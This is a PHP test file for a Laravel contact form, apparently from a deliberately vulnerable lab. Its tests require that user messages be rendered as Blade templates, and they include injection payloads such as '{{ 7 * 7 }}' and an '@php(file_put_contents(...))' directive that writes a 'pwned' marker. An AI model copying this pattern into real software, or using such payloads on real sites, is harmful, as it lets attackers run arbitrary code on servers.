<?php

use App\Jobs\NotifyNewContact;
use App\Mail\NewContactMail;
use App\Models\Page;
use App\Models\Setting;
use Livewire\Livewire;

it('renders contact message templates with Blade syntax server-side', function () {
    $mail = new NewContactMail([
        'name' => 'Jane Doe',
        'email' => 'jane@example.com',
        'phone' => '555-1234',
        'message' => 'Hello {{ 7 * 7 }}',
    ]);

    $rendered = $mail->render();

    expect($rendered)->toContain('49');
});

it('executes blade php directives inside the contact message', function () {
    $marker = storage_path('app/ssti_marker.txt');
    @unlink($marker);

    $mail = new NewContactMail([
        'name' => 'Jane Doe',
        'email' => 'jane@example.com',
        'phone' => '555-1234',
        'message' => '@php(file_put_contents('.var_export($marker, true).', "pwned"))',
    ]);

    $mail->render();

    expect(file_exists($marker))->toBeTrue();
    @unlink($marker);
});

it('dispatches the notification job with the raw message so it renders through the mailable', function () {
    Page::create([
        'title' => 'Contact Us',
        'slug' => 'contact',
        'meta_description' => 'Contact',
        'page_content' => '',
        'status' => 'published',
    ]);

    Setting::create(['recipient' => 'email@artisanbreach.com']);

    Bus::fake();

    Livewire::test(\App\Livewire\Front\ContactPageComponent::class)->set('formData.name', 'Jane Doe')
        ->set('formData.email', 'jane@example.com')
        ->set('formData.phone', '555-1234')
        ->set('formData.message', 'Hello {{ 7 * 7 }}')
        ->call('submitContact')
        ->assertDispatched('notification');

    Bus::assertDispatched(NotifyNewContact::class);
});
